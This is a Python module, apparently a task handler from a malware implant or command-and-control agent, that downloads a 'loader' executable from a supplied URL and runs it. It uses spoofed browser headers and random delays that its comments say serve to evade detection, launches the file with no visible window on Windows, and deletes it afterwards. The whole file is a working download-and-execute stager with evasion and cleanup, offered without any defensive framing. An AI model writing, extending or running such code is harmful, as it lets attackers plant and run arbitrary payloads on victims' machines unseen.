#!/usr/bin/env python
import os
import sys
import tempfile
import subprocess
import logging
import requests
import time
import random
import platform

class LoaderRunner:
    def __init__(self):
        """Initialize the loader runner module"""
        self.setup_logging()
        
    def setup_logging(self):
        """Setup logging with file and console output"""
        try:
            log_file = "run_loader.log"
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler(log_file),
                    logging.StreamHandler()
                ]
            )
        except Exception as e:
            # Fallback to console-only logging
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s'
            )
            
    def download_file(self, url):
        """
        Download a file from the given URL
        
        Args:
            url: URL to download the file from
            
        Returns:
            Path to the downloaded file or None if download failed
        """
        try:
            # Add user agent and randomized headers to avoid detection
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive'
            }
            
            # Add jitter to avoid pattern detection
            time.sleep(random.uniform(0.5, 1.5))
            
            # Download file
            response = requests.get(url, headers=headers, stream=True)
            
            if response.status_code != 200:
                logging.error(f"Download failed with status code: {response.status_code}")
                return None
                
            # Create a temporary file to store the downloaded content
            fd, temp_path = tempfile.mkstemp(suffix='.exe')
            os.close(fd)
            
            with open(temp_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
                    
            logging.info(f"File downloaded to {temp_path}")
            return temp_path
            
        except Exception as e:
            logging.error(f"Error downloading file: {str(e)}")
            return None
            
    def execute_loader(self, file_path):
        """
        Execute the downloaded loader
        
        Args:
            file_path: Path to the loader executable
            
        Returns:
            dict: Execution result with status and details
        """
        if not os.path.exists(file_path):
            logging.error(f"File not found: {file_path}")
            return {
                'status': 'failed',
                'message': 'Loader file not found'
            }
            
        try:
            # Make file executable if on Unix
            if platform.system() != "Windows":
                os.chmod(file_path, 0o755)
                
            # Execute the loader
            logging.info(f"Executing loader: {file_path}")
            
            # Use different execution methods based on platform
            if platform.system() == "Windows":
                # Use subprocess.Popen to execute the loader
                process = subprocess.Popen(
                    [file_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                # Unix execution
                process = subprocess.Popen(
                    [file_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
            # Get the PID
            pid = process.pid
            logging.info(f"Loader process started with PID {pid}")
            
            # Wait briefly to see if the process crashes immediately
            try:
                return_code = process.wait(timeout=1)
                if return_code != 0:
                    stderr = process.stderr.read().decode()
                    logging.error(f"Loader crashed with return code {return_code}: {stderr}")
                    return {
                        'status': 'failed',
                        'message': f'Loader crashed with return code {return_code}',
                        'details': stderr
                    }
            except subprocess.TimeoutExpired:
                # This is actually good - it means the process is still running
                pass
                
            return {
                'status': 'success',
                'message': f'Loader executed with PID {pid}',
                'pid': pid
            }
                
        except Exception as e:
            logging.error(f"Error executing loader: {str(e)}")
            return {
                'status': 'failed',
                'message': f'Error executing loader: {str(e)}'
            }
            
    def run(self, params):
        """
        Main method to handle the run_loader task
        
        Args:
            params: Dictionary containing task parameters
                - loader_url: URL to download the loader from
                
        Returns:
            dict: Task result with status and details
        """
        try:
            # Get the loader URL
            loader_url = params.get('loader_url')
            
            if not loader_url:
                return {
                    'status': 'failed',
                    'message': 'Loader URL is required'
                }
                
            # Download the loader
            logging.info(f"Downloading loader from {loader_url}")
            file_path = self.download_file(loader_url)
            
            if not file_path:
                return {
                    'status': 'failed',
                    'message': 'Failed to download loader'
                }
                
            # Execute the loader
            result = self.execute_loader(file_path)
            
            # Clean up file after execution
            try:
                time.sleep(1)  # Give the OS a moment to load the file
                os.remove(file_path)
                logging.info(f"Loader file deleted: {file_path}")
            except Exception as e:
                logging.warning(f"Could not delete loader file: {str(e)}")
                
            return result
            
        except Exception as e:
            logging.error(f"Error running loader: {str(e)}")
            return {
                'status': 'failed',
                'message': f'Error running loader: {str(e)}'
            }
            
# Create a singleton instance
runner = LoaderRunner()

def run_task(params):
    """Run the loader task with the given parameters"""
    return runner.run(params) 